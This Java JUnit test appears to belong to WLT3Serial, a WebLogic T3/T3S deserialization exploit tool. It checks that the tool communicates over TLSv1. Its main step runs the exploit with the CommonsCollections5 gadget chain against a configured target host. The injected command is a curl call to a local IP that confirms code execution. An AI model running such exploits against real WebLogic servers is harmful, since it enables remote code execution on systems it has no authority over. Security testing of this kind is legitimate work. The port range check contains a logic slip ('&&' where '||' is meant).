/*
	TLSv1Test.java
	
	v0.3 ()

	Test to ensure WLT3Serial communicates via T3S with TLSv1
*/

package bort.millipede.wlt3.tests.ssltls;

import bort.millipede.wlt3.WLT3Serial;
import java.net.Socket;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import org.junit.Assert;
import org.junit.Test;

public class TLSv1Test {
	
	@Test
	public void testAssertUsingTLSv1() {
		//set connection properties
		String host = System.getProperty("wlt3.target.host");
		String strPort = System.getProperty("wlt3.target.port");
		Assert.assertNotNull("System property \"wlt3.target.host\" not set!",host);
		Assert.assertNotNull("System property \"wlt3.target.port\" not set!",strPort);
		int port = -1;
		try {
			port = Integer.parseInt(strPort);
			if((port<0) && (port>65535)) {
				throw new AssertionError("Provided port "+strPort+" is not a valid TCP port! Valid TCP ports: 0-65535");
			}
		} catch (Exception e) {
			throw new AssertionError("Provided port "+strPort+" is not a valid TCP port!");
		}
		
		//attempt to run actual exploit
		WLT3Serial.main(new String[] {"--t3s=TLSv1",host,strPort,"CommonsCollections5","curl http://192.168.1.12/"+this.getClass().getName()+"testAssertUsingTLSv1"});
		
		//create socket for retrieving SSLSocketFactory
		Socket sock = null;
		try {
			sock = new Socket(host,port);
		} catch (Exception e) {
			throw new AssertionError("Error connecting to "+host+":"+strPort+"!");
		}
		SSLSocketFactory defaultFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
		
		//create SSLSocket and retrieve enabled protocol(s)
		SSLSocket sslSock = null;
		try {
			sslSock = (SSLSocket) defaultFactory.createSocket(sock,host,port,true);
		} catch (Exception e) {
			throw new AssertionError("Error connecting to "+host+":"+strPort+"via SSL/TLS!");
		}
		String[] prots = sslSock.getEnabledProtocols();
		
		//Assert that only 1 SSL/TLS protocol is enabled and that it is TLSv1
		Assert.assertEquals("Multiple SSL/TLS protocols enabled instead of only TLSv1!",1,prots.length);
		Assert.assertEquals(prots[0]+" enabled rather than TLSv1","TLSv1",prots[0]);
		
		//attempt to close SSLSocket, ignore any errors
		try {
			sslSock.close();
		} catch (Exception e) {
			//don't care
		}
		System.out.println(this.getClass().getName()+"->testAssertUsingTLSv1: WLT3Serial executed successfully using T3S with TLSv1");
	}
}

